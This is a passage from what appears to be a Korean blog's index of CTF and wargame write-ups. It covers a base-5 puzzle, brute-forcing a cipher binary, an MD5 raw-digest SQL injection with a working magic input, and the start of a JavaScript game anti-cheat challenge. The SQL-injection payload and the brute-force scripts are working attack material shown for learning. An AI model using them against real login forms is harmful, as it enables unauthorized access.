준다.03020342042004411120422040104210422041304011120431040404100420041211204310404034204311120310030403231120410043011203421120433040104240441112041004200431040104240401043004310410042004031120434042104140401042012404301120404034203440412041004200403112034404210414042204010431041004310410042104201411120310030403231120410043011203421120344042104140422040104310410043104100421042011204210402112042104200413044111204340421041404010420141032204040342043111204100430112034211202400413034204030223031003040323044303140404040103400403041004241440340034414304140422040104310410043104100421042003400303042104330401041403430401042403400314040404401000문제 이름과 적혀있는 숫자들을 봤을 때 이 숫자는 5진수라는 것을 알 수 있었다.5진수라는 사실은 쉽게 알 수 있었는데, 그 다음의 관건은 도대체 몇개 씩 숫자를 잘라서 문자로 바꿔야 하냐는 것이었다.이 숫자의 갯수는 총 638개이며, 아스키 코드에서 출력 가능한 문자의 범위는 5진수로 113(!) ~ 1001(~) 이었다.그래서 이 숫자들을 3개 혹은 4개로 잘라 아스키 코드의 문자로 바꾸면 되지 않을까 생각 했었다.그런데 638개는 3으로도, 4로도 나누어 떨어지지 않았다.한동안 고민하다가 플래그 형식이 POX{XXX}라는 것을 생각 해 POX라는 문자가 숫자 안에 있는 지 확인 해 보았다.POX는 5진수로 310 304 323이다.이 숫자를 찾아보니 031003040323이 있는 부분을 찾을 수 있었다.그래서 숫자를 4개씩 잘라 아스키 코드의 문자로 바꾸어 출력 해 보았다.중간에 자꾸 아스키 코드 범위가 넘어간다고 해서 일단 출력 되는 부분만 문자로 보이게 아래와 같이 구현 해 보았다.data = \"\"\"03020342042004411120422040104210422041304011120431040404100420041211204310404034204311120310030403231120410043011203421120433040104240441112041004200431040104240401043004310410042004031120434042104140401042012404301120404034203440412041004200403112034404210414042204010431041004310410042104201411120310030403231120410043011203421120344042104140422040104310410043104100421042011204210402112042104200413044111204340421041404010420141032204040342043111204100430112034211202400413034204030223031003040323044303140404040103400403041004241440340034414304140422040104310410043104100421042003400303042104330401041403430401042403400314040404401000\"\"\".replace(\"\\n\", \"\")flag = \"\"for i in range(0, len(data), 4):        check_num = str(int(data[i])) + str(int(data[i + 1])) + str(int(data[i + 2])) + str(int(data[i + 3]))        print check_num,        num = (int(data[i])) * 125 + (int(data[i +1])) * 25 + (int(data[i + 2])) * 5 + int(data[i + 3]) * 1        if num &lt; 127:                flag += str(chr(num))                print chr(num)        else:                print \"\"그 결과 아래와 같았다.$ python ex.py 0302 M0342 a0420 n0441 y1120 4220 4010 4210 4220 4130 4011 1204 3104 0404 h1004 2004 1211 2043 1040 4034 2043 1112 0310 P0304 O0323 X1120 4100 4301 1203 4211 2043 3040 1042 4044 1112 0410 i0420 n0431 t0401 e0424 r0401 e0430 s0431 t0410 i0420 n0403 g1120 4340 4210 4140 4010 4201 2404 3011 2040 4034 2034 4041 2041 0042  0040  3112 0344 c0421 o0414 m0422 p0401 e0431 t0410 i0431 t0410 i0421 o0420 n1411 1203 1003 0403 g2311 2041 0043  0112  0342 a1120 3440 4210 4140 4220 4010 4310 4100 4310 4100 4210 4201 1204 2104 0211 82042 1042 0041  3044 1112 0434 w0421 o0414 m0401 e0420 n1410 3220 4040 3420 4311 1204 1004 3011 2034 2112 0240 F0413 l0342 a0403 g0223 ?0310 P0304 O0323 X0443 {0314 T0404 h0401 e0340 _0403 g0410 i0424 r1440 3400 3441 4304 1404 2204 0104  3104 1004 3104 1004 2104 2003 4003 0304 O2104 3304 0104  1403 4304 0104  2403 4003 1404 0404 h4010결과를 살펴보면 중간에 POX{The_gir까지 나오는 것으로 보아 마지막 부분이 플래그 라는 것을 알 수 있었다.사실 대회때는 저 플래그 부분을 기준으로 숫자를 잘라서 테스트 하며 플래그를 얻을 수 있었다. ㅎㅎ그런데 이건 Write-up이니까 차분히 풀어보며 제대로 된 풀이 방법을 적으려고 한다.첫 번째로 결과가 나오지 않은 부분을 보면 5진수의 숫자가 112로 시작한다는 것을 알 수 있었다.0302 M0342 a0420 n0441 y1120 4220 4010112 다음이 0이고, 그 아래의 숫자는 4220, 4010이었다.이걸 보니까 112만 빠진다면, 0422, 0401이 되어 pe라는 것을 알 수 있었다.나중에 대회 끝나고 알았는데 112는 10진수로 바꾸면 32가 되어 공백을 의미한다고 한다. ㅂㄷㅂㄷ그래서 112를 0112로 바꾸는 코드를 짜 다시 테스트를 해 보았다.data = \"\"\"03020342042004411120422040104210422041304011120431040404100420041211204310404034204311120310030403231120410043011203421120433040104240441112041004200431040104240401043004310410042004031120434042104140401042012404301120404034203440412041004200403112034404210414042204010431041004310410042104201411120310030403231120410043011203421120344042104140422040104310410043104100421042011204210402112042104200413044111204340421041404010420141032204040342043111204100430112034211202400413034204030223031003040323044303140404040103400403041004241440340034414304140422040104310410043104100421042003400303042104330401041403430401042403400314040404401000\"\"\".replace(\"\\n\", \"\").replace(\"112\", \"0112\")flag = \"\"for i in range(0, len(data), 4):        check_num = str(int(data[i])) + str(int(data[i + 1])) + str(int(data[i + 2])) + str(int(data[i + 3]))        print check_num,        num = (int(data[i])) * 125 + (int(data[i +1])) * 25 + (int(data[i + 2])) * 5 + int(data[i + 3]) * 1        if num &lt; 127:                flag += str(chr(num))                print chr(num)        else:                print \"\"$ python ex.py 0302 M0342 a0420 n0441 y0112  0422 p0401 e0421 o0422 p0413 l0401 e0112  0431 t0404 h0410 i0420 n0412 k0112  0431 t0404 h0342 a0431 t0112  0310 P0304 O0323 X0112  0410 i0430 s0112  0342 a0112  0433 v0401 e0424 r0441 y0112  0410 i0420 n0431 t0401 e0424 r0401 e0430 s0431 t0410 i0420 n0403 g0112  0434 w0421 o0414 m0401 e0420 n1240 4300 1120 4040 3420 3440 4120 4100 4200 4030 1120 3440 4210 4140 4220 4010 4310 4100 4310 4100 4210 4201 4101 1203 1003 0403 g2301 1204 1004 3001 1203 4201 1203 4404 2104 1404 2204 0104  3104 1004 3104 1004 2104 2001 1204 2104 0201 31204 2104 2004 1304 4101 1204 3404 2104 1404 0104  2014 1032 2040 4034 2043 1011 2041 0043  0011  2034 2011 2024 0041  3034 2040 3022 3031 0030 4032 3044 3031 4040 4040 1034 0040  3041 0042  4144 0340 _0344 c1430 4140 4220 4010 4310 4100 4310 4100 4210 4200 3400 3030 4210 4330 4010 4140 3430 4010 4240 3400 3140 4040 4401이번에는 124 부분에서 막혔다.124는 계산 해 보니 '였다.그래서 124를 비롯 해 막히는 숫자 앞에 모두 0을 붙여 아래와 같이 코드를 구현했다.data = \"\"\"03020342042004411120422040104210422041304011120431040404100420041211204310404034204311120310030403231120410043011203421120433040104240441112041004200431040104240401043004310410042004031120434042104140401042012404301120404034203440412041004200403112034404210414042204010431041004310410042104201411120310030403231120410043011203421120344042104140422040104310410043104100421042011204210402112042104200413044111204340421041404010420141032204040342043111204100430112034211202400413034204030223031003040323044303140404040103400403041004241440340034414304140422040104310410043104100421042003400303042104330401041403430401042403400314040404401000\"\"\".replace(\"\\n\", \"\").replace(\"112\", \"0112\").replace(\"124\", \"0124\").replace(\"142\", \"0142\").replace(\"141\", \"0141\").replace(\"144\", \"0144\").replace(\"143\", \"0143\")flag = \"\"for i in range(0, len(data), 4):        check_num = str(int(data[i])) + str(int(data[i + 1])) + str(int(data[i + 2])) + str(int(data[i + 3]))        num = (int(data[i])) * 125 + (int(data[i +1])) * 25 + (int(data[i + 2])) * 5 + int(data[i + 3]) * 1        flag += str(chr(num))print flag그 결과 아래와 같은 긴 문자열과 함께 플래그를 얻을 수 있었다.$ python ex.pyMany people think that POX is a very interesting women's hacking competition. POX is a competition of only women.What is a Flag?POX{The_gir1_c0mpetition_November_Thx}POX{The_gir1_c0mpetition_November_Thx}WHATISTHIS이 문제는 WHATISTHIS라는 elf 바이너리와 아래와 같은 문자열이 있는 파일이 주어진다.WV EV E CBSU PENLOGUREJS DRVW UNJJ Q CGDKDK OZFD GC NZFGUMHWJB ZN GKT EFZRZUTB TIMJFRK VT X WBSF LJQY IGKZHTR BC ODM MTQAQG IWM MLYJM RH AOTGT YAETH ZCKAV VK IRIW EK IUA B TUZY CP TXKT RWSXTX WGLVQZZCYGBU MM OYWKUNG NC AASTBBA OW HHWTJ QJARXB YS FUUM ENVY BJTFRJAN LUBHKTR BHQS VC XRAIYPBLCCOADPLYR그래서 WHATISTHIS 바이너리를 실행 해 보면 다음과 같았다.$ ./WHATISTHIS Ring Setting(AAA-ZZZ): AAAPlain Text(Only Uppercase and space): TESTJLYS테스트를 해 보며 아래와 같은 사실을 알 수 있었다.  python으로 만들어진 바이너리이다.  Ring으로 입력하는 값과 Plain Text로 입력하는 값이 특정 연산을 해 결과가 나온다.  띄어쓰기는 결과값에 영향을 주지 않으며, Ring이 달라지거나 Plain Text가 달라지면 결과값도 달라진다.처음에는 python으로 만들어진 바이너리라는 것을 보고 다시 python 코드로 바꾸는 방법을 찾아 코드를 분석 해 보려고 했다.그러다 문득 주어진 문자열의 WV EV E가 IT IS A가 아닐까 생각하게 되었다.만약 Ring 값과 Plain Text 값이 같다면 결과값도 같기 때문에 평문의 일부를 알 수 있다면 충분히 Brute Force 공격을 통해 Ring을 알아낼 수 있다.또한 Ring을 알아낸다면, 또 다시 Brute Force를 통해 나머지 평문도 손쉽게 알아낼 수 있다.이 풀이가 정석 풀이는 아닐 것이라고 생각했지만, 방법을 찾을 수가 없어서 일단 Brute Force 공격을 시도하기 위해 아래와 같이 코드를 구현했다.from pwn import *\"\"alpha = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"for i in range(23, len(alpha)):    for j in range(len(alpha)):        for k in range(len(alpha)):            ring = alpha[i]+alpha[j]+alpha[k]            print ring            string = \"IT\"            s = process(\"./WHATISTHIS\")            s.send(ring+\"\\n\")            s.send(string+\"\\n\")            result = s.recv()[-3:-1]            if result == \"WV\":                print \"[*] found\"                print \"  - ring :\", ring                print \"  - string :\", string                with open(\"result\", \"a+\") as fp:                     fp.write(ring + \"\\n\")            s.close()Ring의 값을 AAA ~ ZZZ 까지 돌도록 하고, Plain Text로는 IT을 주어 그 값이 WV가 나온다면, 이 Ring을 result에 저장하도록 했다.그리고 결과가 나올 때 마다 다시 WHATISTHIS를 실행 해 ITIS를 입력했을 때 WVEV가 나오는 값이 있는지 테스트를 해 보았다.(이 때는 Brute Force 공격으로 풀릴 것이라는 확신이 없어서 소심하게 IT만 테스트 해 보았는데, 풀고 나니 그냥 ITIS를 한번에 테스트 해 볼껄 이라는 생각이 든다.)그 결과 WVEV 결과가 나오는 Ring 갑인 SEA를 구할 수 있었다.이제 Ring을 구했으니, Plain Text에 Brute Force로 테스트를 해 보았다.from pwn import *import osdata = \"\"\"WV EV E CBSU PENLOGUREJS DRVW UNJJ Q CGDKDK OZFD GC NZFGUMHWJB ZN GKT EFZRZUTB TIMJFRK VT X WBSF LJQY IGKZHTR BC ODM MTQAQG IWM MLYJM RH AOTGT YAETH ZCKAV VK IRIW EK IUA B TUZY CP TXKT RWSXTX WGLVQZZCYGBU MM OYWKUNG NC AASTBBA OW HHWTJ QJARXB YS FUUM ENVY BJTFRJAN LUBHKTR BHQS VC XRAIYPBLCCOADPLYR\"\"\"alpha = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"ring = \"SEA\"string = \"IT IS A\"for i in range(len(string), len(data)):    for j in range(len(alpha)):        if data[i] == \" \":            string = string + \" \"            break        else:            tmp_string = string + alpha[j]            s = process(\"./WHATISTHIS\")            s.send(ring+\"\\n\")            s.send(tmp_string+\"\\n\")            result = s.recv()[-2]            if result == data[i]:                print tmp_string                string = tmp_string                break            s.close()            os.system(\"rm -rf /tmp/_MEI*\")마지막에 os.system(\"rm -rf /tmp/_MEI*\")가 있는데, 이는 WHATISTHIS를 실행하면 /tmp 디렉토리에 _MEI로 시작하는 디렉토리가 생성된다.근데 어느정도 쌓이면 /tmp 디렉토리가 꽉 차서 더 이상 WHATISTHIS를 실행시킬 수가 없다.그래서 한 번 실행시킬 때 마다 해당 디렉토리를 삭제하기 위해 저 부분을 추가 해 주었다.그 결과 아래와 같이 평문을 얻을 수 있었다.Brute Force는 문제의 의도가 아닌 줄 알았는데 플래그를 보니 의도가 맞았나보다.IT IS A LONG ESTABLISHED FACT THAT A READER WILL BE DISTRACTED BY THE READABLE CONTENT OF A PAGE WHEN LOOKING AT ITS LAYOUT THE POINT OF USING LOREM IPSUM IS THAT IT HAS A MORE OR LESS NORMAL DISTRIBUTION OF LETTERS AS OPPOSED TO USING MAKING IT LOOK LIKE READABLE ENGLISH FLAG IS ILIKEBRUTEFORCEITPOX{ILIKEBRUTEFORCEIT}",
        "url": "//ctf/2018/2018/11/15/ctf-poxx2018-writeup.html"
      }
      ,
    
      "wargame-wargame-kr-2018-10-26-wargame-kr-md5-password-html": {
        "title": "[Wargame.kr] md5 password 문제풀이",
        "tags": "Write-up, Wargame.kr",
        "date": "October 26, 2018",
        "author": "",
        "category": "",
        "content": "일하기가 싫으니까 1일 1문제가 너무 잘된다 ㅎㅎㅎ계속 문제 이렇게 꾸준히 풀면 언젠간 CTF에서도 좋은 성적을 얻을 수 있겠지…?? ㅎㅎ이번 문제는 MD5 SQL Injection이다.문제 정보는 다음과 같다.md5('value', true);문제 페이지에 접속하면 password를 입력하는 칸이 하나 있고, 페이지의 소스코드를 확인할 수 있다.&lt;?php if (isset($_GET['view-source'])) {  show_source(__FILE__);  exit(); } if(isset($_POST['ps'])){  sleep(1);  mysql_connect(\"localhost\",\"md5_password\",\"md5_password_pz\");  mysql_select_db(\"md5_password\");  mysql_query(\"set names utf8\");  /*    create table admin_password(   password char(64) unique  );    */  include \"../lib.php\"; // include for auth_code function.  $key=auth_code(\"md5 password\");  $ps = mysql_real_escape_string($_POST['ps']);  $row=@mysql_fetch_array(mysql_query(\"select * from admin_password where password='\".md5($ps,true).\"'\"));  if(isset($row[0])){   echo \"hello admin!\".\"&lt;br /&gt;\";   echo \"Password : \".$key;  }else{   echo \"wrong..\";  } }?&gt;&lt;style&gt; input[type=text] {width:200px;}&lt;/style&gt;&lt;br /&gt;&lt;br /&gt;&lt;form method=\"post\" action=\"./index.php\"&gt;password : &lt;input type=\"text\" name=\"ps\" /&gt;&lt;input type=\"submit\" value=\"login\" /&gt;&lt;/form&gt;&lt;div&gt;&lt;a href='?view-source'&gt;get source&lt;/a&gt;&lt;/div&gt;소스코드를 살펴보면, 내가 입력 한 password의 값이 md5 함수를 통과 해 쿼리문의 password 자리에 들어간다.근데 이 때, md5($ps, true)를 사용한다.php에서 md5() 함수를 사용할 때, 두 번째 인자는 true 혹은 false의 값을 받는다.만약에 true라면, 결과가 binary 형태로 나오고, false라면 hex 값의 형태로 나온다.물론 defalut 값은 false이다.두 번째 인자가 ture일 경우 만약에 내가 입력 한 password가 md5 함수를 통과하여 binary 형태로 나왔을 때, ASCII 범위 안에 있는 문자라면 그대로 출력된다.때문에 만약 md5 함수를 통과 한 결과가 ' or ' 형태를 띈다면 완성되는 쿼리는 다음과 같기 때문에 SQL Injection이 가능해 진다.select * from admin_password where password='' or ''이런 형태가 나오는 값을 직접 구해봐도 되지만, 아마도 인터넷에 잘 알려져 있을 것 같았다.그래서 구글신에게 md5 sql injection이라고 검색을 해 봤더니 아래와 같은 값을 입력하면 ' or ' 형태의 결과값을 얻을 수 있다고 한다.129581926211651571912466741651878684928이를 직접 python으로 테스트 해 보았다.$ pythonPython 2.7.12 (default, Dec  4 2017, 14:50:18) [GCC 5.4.0 20160609] on linux2Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; import hashlib&gt;&gt;&gt; print hashlib.md5(\"129581926211651571912466741651878684928\").digest()ٔ0Do#ࠁ'or'8그 결과 완성되는 쿼리는 다음과 같다.select * from admin_password where password='ٔ0Do#ࠁ'or'8'때문에 password='ٔ0Do#ࠁ' 부분은 false가 되고 '8' 부분이 true가 되어 값을 추출할 수 있다.다시 문제 페이지로 돌아가 129581926211651571912466741651878684928 입력했더니 아래와 같이 flag를 얻을 수 있었다.FLAG : 3f73ad2d57d66488b92c10f0bce1cfcb35e99882 ",
        "url": "//wargame/wargame.kr/2018/10/26/wargame.kr-md5_password.html"
      }
      ,
    
      "wargame-wargame-kr-2018-10-25-wargame-kr-fly-to-the-moon-html": {
        "title": "[Wargame.kr] fly to the moon 문제풀이",
        "tags": "Write-up, Wargame.kr",
        "date": "October 25, 2018",
        "author": "",
        "category": "",
        "content": "다음 문제는 fly to the moon 이다.이 문제는 Javascript 문제이다.문제 정보는 다음과 같다.javascript game.can you clear with bypass prevent cheating system?문제에 접속하면 정보대로 Javascript로 구현 된 게임이 있다.비행기가 하나 있고 이 비행기가 벽을 피해서 날아야 하는 게임이다.심지어 게임을 좀 해 보면 양쪽 벽이 점점 줄어든다.벽에 닿으면 죽게 되는데, 그 때 아래와 같은 화면을 확인할 수 있다.31337 점을 획득하라고 한다.그런데 아까 말했듯이 조금만 게임해도 벽이 점점 줄어들기 때문에 31337 점을 얻는 것은 불가능 해 보인다.게임을 하면서 proxy로 잡아보면, 죽을 때 high-scores.php에 token과 현재 나의 score를 보내는 것을 확인할 수 있다.그래서 일단 소스코드를 확인 해 보았다.eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('76 58=[\"\\\\89\\\\66\\\\68\\\\68\\\\154\\\\68\\\\67\\\\92\\\\59\\\\71\",\"\\\\70\\\\74\\\\59\\\\70\\\\89\\\\136\\\\66\\\\86\\\\59\",\"\\\\81\\\\59\\\\63\\\\118\\\\70\\\\61\\\\71\\\\59\",\"\\\\124\\\\66\\\\64\\\\70\\\\118\\\\70\\\\61\\\\71\\\\59\",\"\\\\69\\\\74\\\\71\\\\66\\\\64\\\\89\\\\98\\\\78\\\\64\\\\64\\\\59\\\\68\",\"\\\\97\\\\66\\\\84\\\\63\\\\74\\\\98\\\\78\\\\64\\\\64\\\\59\\\\68\",\"\\\\61\\\\104\\\\148\\\\59\\\\70\\\\63\",\"\\\\159\\\\61\\\\90\\\\70\\\\74\\\\59\\\\67\\\\63\\\\66\\\\64\\\\81\\\\155\\\\90\\\\66\\\\86\\\\90\\\\92\\\\61\\\\78\\\\90\\\\70\\\\67\\\\64\",\"\\\\97\\\\67\\\\71\\\\64\",\"\\\\61\\\\86\\\\86\\\\69\\\\59\\\\63\\\\136\\\\59\\\\86\\\\63\",\"\\\\63\\\\78\\\\64\\\\64\\\\59\\\\68\",\"\\\\81\\\\59\\\\63\\\\170\\\\68\\\\59\\\\85\\\\59\\\\64\\\\63\\\\124\\\\92\\\\142\\\\84\",\"\\\\63\\\\61\\\\77\",\"\",\"\\\\77\\\\112\",\"\\\\70\\\\69\\\\69\",\"\\\\84\\\\66\\\\69\\\\77\\\\68\\\\67\\\\92\",\"\\\\104\\\\68\\\\61\\\\70\\\\89\",\"\\\\59\\\\67\\\\70\\\\74\",\"\\\\66\\\\85\\\\81\\\\107\\\\68\\\\59\\\\86\\\\63\\\\111\\\\97\\\\67\\\\68\\\\68\",\"\\\\66\\\\85\\\\81\\\\107\\\\71\\\\66\\\\81\\\\74\\\\63\\\\111\\\\97\\\\67\\\\68\\\\68\",\"\\\\91\\\\74\\\\66\\\\81\\\\74\\\\111\\\\69\\\\70\\\\61\\\\71\\\\59\\\\69\",\"\\\\71\\\\59\\\\85\\\\61\\\\103\\\\59\",\"\\\\63\\\\67\\\\104\\\\68\\\\59\",\"\\\\64\\\\61\\\\64\\\\59\",\"\\\\84\\\\66\\\\103\\\\91\\\\69\\\\70\\\\61\\\\71\\\\59\\\\111\\\\63\\\\67\\\\104\\\\68\\\\59\",\"\\\\70\\\\68\\\\66\\\\70\\\\89\",\"\\\\63\\\\59\\\\112\\\\63\",\"\\\\69\\\\77\\\\67\\\\64\\\\91\\\\69\\\\70\\\\61\\\\71\\\\59\",\"\\\\68\\\\59\\\\86\\\\63\",\"\\\\66\\\\85\\\\81\\\\91\\\\69\\\\74\\\\66\\\\77\",\"\\\\69\\\\68\\\\61\\\\97\",\"\\\\86\\\\67\\\\84\\\\59\\\\142\\\\64\",\"\\\\104\\\\67\\\\70\\\\89\\\\81\\\\71\\\\61\\\\78\\\\64\\\\84\\\\149\\\\77\\\\61\\\\69\\\\66\\\\63\\\\66\\\\61\\\\64\",\"\\\\168\\\\167\\\\164\\\\90\",\"\\\\84\\\\66\\\\103\\\\91\\\\63\\\\78\\\\64\\\\64\\\\59\\\\68\",\"\\\\71\\\\67\\\\64\\\\84\\\\61\\\\85\",\"\\\\86\\\\68\\\\61\\\\61\\\\71\",\"\\\\78\\\\77\\\\84\\\\67\\\\63\\\\59\\\\98\\\\78\\\\64\\\\64\\\\59\\\\68\\\\143\\\\150\",\"\\\\86\\\\67\\\\84\\\\59\\\\151\\\\78\\\\63\",\"\\\\154\\\\151\\\\118\\\\98\",\"\\\\74\\\\66\\\\81\\\\74\\\\149\\\\69\\\\70\\\\61\\\\71\\\\59\\\\69\\\\107\\\\77\\\\74\\\\77\",\"\\\\63\\\\61\\\\89\\\\59\\\\64\\\\146\",\"\\\\169\\\\69\\\\70\\\\61\\\\71\\\\59\\\\146\",\"\\\\67\\\\148\\\\67\\\\112\",\"\\\\74\\\\63\\\\85\\\\68\",\"\\\\77\\\\91\\\\97\\\\59\\\\68\\\\70\\\\61\\\\85\\\\59\",\"\\\\78\\\\77\\\\84\\\\67\\\\63\\\\59\\\\98\\\\61\\\\89\\\\59\\\\64\\\\143\\\\150\",\"\\\\63\\\\74\\\\112\\\\155\\\\90\\\\152\\\\74\\\\71\\\\66\\\\69\\\\63\\\\66\\\\67\\\\64\\\\90\\\\145\\\\61\\\\64\\\\63\\\\61\\\\92\\\\67\",\"\\\\85\\\\61\\\\78\\\\69\\\\59\\\\61\\\\103\\\\59\\\\71\",\"\\\\91\\\\70\\\\74\\\\71\\\\66\\\\69\\\\63\\\\66\\\\67\\\\64\",\"\\\\85\\\\61\\\\78\\\\69\\\\59\\\\61\\\\78\\\\63\",\"\\\\71\\\\59\\\\67\\\\84\\\\92\",\"\\\\152\\\\74\\\\71\\\\66\\\\69\\\\63\\\\66\\\\67\\\\64\\\\90\\\\145\\\\61\\\\64\\\\63\\\\61\\\\92\\\\67\",\"\\\\77\\\\67\\\\81\\\\59\\\\175\",\"\\\\85\\\\61\\\\78\\\\69\\\\59\\\\85\\\\61\\\\103\\\\59\",\"\\\\63\\\\61\\\\89\\\\59\\\\64\\\\107\\\\77\\\\74\\\\77\",\"\\\\81\\\\59\\\\63\"];62 119(){76 174=73;76 108=93;62 141(){108=173;79 93};62 130(){79 108};73[58[0]]=62(){141();79 93};73[58[1]]=62(){79 130()};76 116=0;62 131(){79 116};62 133(){72(108){116++};79 93};73[58[2]]=62(){79 131()};73[58[3]]=62(){133();79 93};76 123=161;62 138(){123-=20;79 93};62 144(){79 123};73[58[4]]=62(){138();79 93};73[58[5]]=62(){79 144()}};76 95=0;76 110=0;76 134=125;76 75=117;76 94=117;76 101=0;76 102=0;76 99=0;76 96=0;82=106 127(20);88=106 127(20);62 153(){87=106 119();72(58[6]==135 105){105[58[8]](58[7])};110=121[58[11]](58[10])[58[9]];134+=110;65=0;122(65=0;65&lt;20;65++){82[65]=80;88[65]=137};$(58[19])[58[18]](62(83){65=83*25;$(73)[58[15]](58[12],58[13]+65+58[14]);$(73)[58[15]](58[16],58[17])});$(58[20])[58[18]](62(83){65=83*25;$(73)[58[15]](58[12],58[13]+65+58[14]);$(73)[58[15]](58[16],58[17])});$(58[25])[58[26]](62(){$(58[23])[58[22]](58[21]);$(58[25])[58[15]](58[16],58[24]);132();114()})};62 132(){87=106 119();72(58[6]==135 105){105[58[8]](58[7])};75=117;101=0;102=0;99=0;$(58[28])[58[27]](58[13]+0);$(58[30])[58[15]](58[29],75+58[14]);65=0;122(65=0;65&lt;20;65++){82[65]=80;88[65]=137};$(58[30])[58[32]](58[31]);$(58[19])[58[18]](62(83){65=83*25;$(73)[58[15]](58[12],58[13]+65+58[14]);$(73)[58[15]](58[16],58[17])});$(58[20])[58[18]](62(83){65=83*25;$(73)[58[15]](58[12],58[13]+65+58[14]);$(73)[58[15]](58[16],58[17])})};62 114(){95=95+2;72(95&gt;20){95=0};$(58[35])[58[15]](58[33],58[34]+95+58[14]);72(75+32&lt;125){72(75+46&lt;94){75+=4}109{72(75+16&lt;94){75+=2}}};72(75&gt;0){72(75-14&gt;94){75-=4}109{72(75+16&gt;94){75-=2}}};$(58[30])[58[15]](58[29],75+58[14]);102++;72(102&gt;60){102=0;96=126[58[37]](126[58[36]]()*2)};72(82[0]&lt;10){96=1}109{72(88[0]&gt;166){96=0}};65=0;122(65=20;65&gt;0;65--){82[65]=82[65-1];88[65]=88[65-1]};72(96==0){82[0]-=3};72(96==1){82[0]+=3};88[0]=82[0]+87[58[5]]();$(58[19])[58[18]](62(83){$(73)[58[15]](58[29],58[13]+82[83]+58[14])});$(58[20])[58[18]](62(83){$(73)[58[15]](58[29],58[13]+88[83]+58[14])});72(87[58[5]]()&gt;=120){99++;72(99&gt;100){99=0;87[58[4]]();82[0]+=10}};101++;72(101&gt;20){101=0;87.165();$(58[28])[58[27]](58[13]+87[58[2]]())};72(75&lt;=82[18]+20||75+32&gt;=88[18]){87[58[0]]()};72(87[58[1]]()){158(58[38],10)}109{$(58[30])[58[39]](58[31]);$(58[19])[58[15]](58[16],58[24]);$(58[20])[58[15]](58[16],58[24]);$[58[44]]({171:58[40],156:58[41],162:58[42]+115+58[43]+87[58[2]](),157:62(113){147(113)}})}};62 160(){79};62 147(113){$(58[25])[58[45]](113);$(58[25])[58[15]](58[16],58[17])};$(121)[58[52]](62(){$(58[46])[58[15]](58[16],58[17]);140();163(58[47],172);$(58[46])[58[26]](62(){$(58[46])[58[15]](58[16],58[24]);153();114()});$(58[50])[58[49]](62(){$(73)[58[45]](58[48])});$(58[50])[58[51]](62(){$(73)[58[45]](139)})});76 139=58[53];$(121)[58[55]](62(129){94=129[58[54]]-110});76 115=58[13];62 140(){$[58[57]](58[56],62(128){115=128})};',10,176,'||||||||||||||||||||||||||||||||||||||||||||||||||||||||||_0x32bb|x65||x6F|function|x74|x6E|y|x69|x61|x6C|x73|x63|x72|if|this|x68|ship_x|var|x70|x75|return||x67|left_wall|_0x8618x16|x64|x6D|x66|BTunnelGame|right_wall|x6B|x20|x23|x79|true|pos_x|bg_val|t_state|x77|x54|c_w||c_s|c_r|x76|x62|console|new|x2E|_0x8618x3|else|rail_left|x5F|x78|_0x8618x19|updateTunnel|token|_0x8618x6|234|x53|secureGame||document|for|_0x8618x9|x42|500|Math|Array|_0x8618x20|_0x8618x1d|_0x8618x5|_0x8618x7|restartTunnel|_0x8618x8|rail_right|typeof|x4C|400|_0x8618xa|temp|updateToken|_0x8618x4|x49|x28|_0x8618xb|x4D|x3D|showHighScores|x6A|x2D|x29|x4F|x43|initTunnel|x50|x2C|url|success|setTimeout|x44|scoreUpdate|320|data|setInterval|x25|BincScore|470|x30|x35|x26|x45|type|10000|false|_0x8618x2|x58'.split('|'),0,{}))이 코드가 Javascript 코드만 확인 해 본 것이다.너무 복잡해서 이 상태로는 분석을 못할 것 같아 JS Beautifier를 사용했다.이 페이지에 소스코드를 넣고 Beautify JavaScript or HTML 버튼을 누르면 이쁘게 정리된 코드를 확인할 수 있다.function secureGame() {    var _0x8618x2 = this;    var _0x8618x3 = true;    function _0x8618x4() {        _0x8618x3 = false;        return true    };    function _0x8618x5() {        return _0x8618x3    };    this['killPlayer'] = function() {        _0x8618x4();        return true    };    this['checkLife'] = function() {        return _0x8618x5()    };    var _0x8618x6 = 0;    function _0x8618x7() {        return _0x8618x6    };    function _0x8618x8() {        if (_0x8618x3) {            _0x8618x6++        };        return true    };    this['getScore'] = function() {        return _0x8618x7()    };    this['BincScore'] = function() {        _0x8618x8();        return true    };    var _0x8618x9 = 320;    function _0x8618xa() {        _0x8618x9 -= 20;        return true    };    function _0x8618xb() {        return _0x8618x9    };    this['shrinkTunnel'] = function() {        _0x8618xa();        return true    };    this['widthTunnel'] = function() {        return _0x8618xb()    }};var bg_val = 0;var rail_left = 0;var rail_right = 500;var ship_x = 234;var pos_x = 234;var c_s = 0;var c_r = 0;var c_w = 0;var t_state = 0;left_wall = new Array(20);right_wall = new Array(20);function initTunnel() {    BTunnelGame = new secureGame();    if ('object' == typeof console) {        console['warn']('Do cheating, if you can')    };    rail_left = document['getElementById']('tunnel')['offsetLeft'];    rail_right += rail_left;    y = 0;    for (y = 0; y &lt; 20; y++) {        left_wall[y] = 80;        right_wall[y] = 400    };    $('img.left_wall')['each'](function(_0x8618x16) {        y = _0x8618x16 * 25;        $(this)['css']('top', '' + y + 'px');        $(this)['css']('display', 'block')    });    $('img.right_wall')['each'](function(_0x8618x16) {        y = _0x8618x16 * 25;        $(this)['css']('top', '' + y + 'px');        $(this)['css']('display', 'block')    });    $('div#score_table')['click'](function() {        $('table')['remove']('#high_scores');        $('div#score_table')['css']('display', 'none');        restartTunnel();        updateTunnel()    })};function restartTunnel() {    BTunnelGame = new secureGame();    if ('object' == typeof console) {        console['warn']('Do cheating, if you can')    };    ship_x = 234;    c_s = 0;    c_r = 0;    c_w = 0;    $('span#score')['text']('' + 0);    $('img#ship')['css']('left', ship_x + 'px');    y = 0;    for (y = 0; y &lt; 20; y++) {        left_wall[y] = 80;        right_wall[y] = 400    };    $('img#ship')['fadeIn']('slow');    $('img.left_wall')['each'](function(_0x8618x16) {        y = _0x8618x16 * 25;        $(this)['css']('top', '' + y + 'px');        $(this)['css']('display', 'block')    });    $('img.right_wall')['each'](function(_0x8618x16) {        y = _0x8618x16 * 25;        $(this)['css']('top', '' + y + 'px');        $(this)['css']('display', 'block')    })};function updateTunnel() {    bg_val = bg_val + 2;    if 